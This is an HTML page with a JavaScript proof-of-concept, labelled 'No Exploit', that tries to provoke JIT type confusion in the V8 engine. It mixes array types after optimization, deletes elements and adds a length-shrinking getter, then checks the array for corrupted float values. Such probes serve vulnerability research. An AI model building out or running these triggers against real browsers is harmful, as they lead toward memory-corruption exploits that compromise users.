<!doctype html>
<meta charset="utf-8">
<title>V8 Signal PoC - Strong Deterministic</title>

<h3>V8 Signal Test (No Exploit)</h3>
<pre id="log"></pre>

<script>
const log = m => {
  document.getElementById("log").textContent += m + "\n";
  console.log(m);
};

// convert float → bits
function f2i(f) {
  const buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = f;
  return new BigUint64Array(buf)[0];
}

// target function
function vuln(a, i) {
  return a[i] + 1.1;
}

// warmup JIT
function warmup() {
  let arr = new Array(64);
  for (let i = 0; i < 64; i++) arr[i] = i + 0.5;

  for (let i = 0; i < 150000; i++) {
    vuln(arr, i & 63);
  }
  return arr;
}

// stronger deterministic confusion attempt
function trigger(arr) {

  // keep double elements first
  for (let i = 0; i < 32; i++) arr[i] = i + 0.5;

  // stabilize inline cache
  for (let i = 0; i < 20000; i++) vuln(arr, i & 31);

  // introduce type change AFTER optimization
  arr[1] = {};     // object into double array
  arr[2] = 13.37;

  // hole creation
  delete arr[5];
  delete arr[6];

  // side-effect getter (critical)
  Object.defineProperty(arr, 4, {
    get() {
      arr.length = 1;   // shrink mid-access
      return 1.1;
    }
  });

  return arr;
}

// check anomalies
function check(arr) {
  for (let i = 0; i < 10; i++) {
    let v = arr[i];

    if (typeof v === "number") {
      let bits = f2i(v);
      let hex = bits.toString(16);

      // detect weird float patterns
      if (hex.startsWith("7ff") && !Number.isNaN(v)) {
        log(`[!!!] INVALID FLOAT @${i} = ${v} bits=0x${hex}`);
      } else {
        log(`[OK] number @${i} = ${v}`);
      }

    } else {
      log(`[INFO] type=${typeof v} @${i}`);
    }
  }
}

// main
function run() {
  log("[*] warmup");
  let base = warmup();

  log("[*] trigger");
  let arr = base.slice();
  trigger(arr);

  log("[*] invoke optimized path");
  for (let i = 0; i < 50; i++) {
    vuln(arr, i & 7);
  }

  log("[*] checking...");
  check(arr);

  log("[*] done");
}

run();
</script>
